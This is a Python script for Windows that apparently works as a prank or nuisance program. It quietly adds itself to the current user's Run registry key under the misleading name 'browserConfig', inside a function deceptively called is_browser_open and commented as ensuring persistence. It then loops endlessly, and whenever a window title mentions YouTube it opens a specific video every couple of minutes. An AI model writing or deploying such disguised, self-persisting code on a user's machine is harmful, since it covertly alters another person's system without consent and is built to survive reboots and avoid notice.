import time
import os
import sys
import winreg as reg
import pygetwindow as gw


TARGET_SITE = "YouTube"
SCRIPT_NAME = "browserConfig"

def is_browser_open():
    python_exe = sys.executable 
    script_path = os.path.abspath(__file__)

    command = f'start "" "{python_exe}" "{script_path}"'
    key_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_ALL_ACCESS)

        try:
            exiting_value, _ = reg.QueryValueEx(key, SCRIPT_NAME)
            if exiting_value == command:
                reg.CloseKey(key)
                return
        except FileNotFoundError:
            pass
        
        reg.SetValueEx(key, SCRIPT_NAME, 0, reg.REG_SZ, command)
        reg.CloseKey(key)

    except Exception as e:
        print(f"Error accessing registry: {e}")
        return
    
def main():
    # 1. Ensure persistence first
    is_browser_open()

    # 2. The Main Loop
    while True:
        try:
            windows = gw.getAllTitles()
            # Check if any window title contains our target
            if any(TARGET_SITE.lower() in title.lower() for title in windows):
                os.system("start https://www.youtube.com/watch?v=JluQoTEg2gU&list=RDJluQoTEg2gU&start_radio=1")
                time.sleep(120) # Sleep to allow the browser to open and load the page
                
            time.sleep(5) # Sleep to save CPU
        except Exception:
            pass

if __name__ == "__main__":
    main()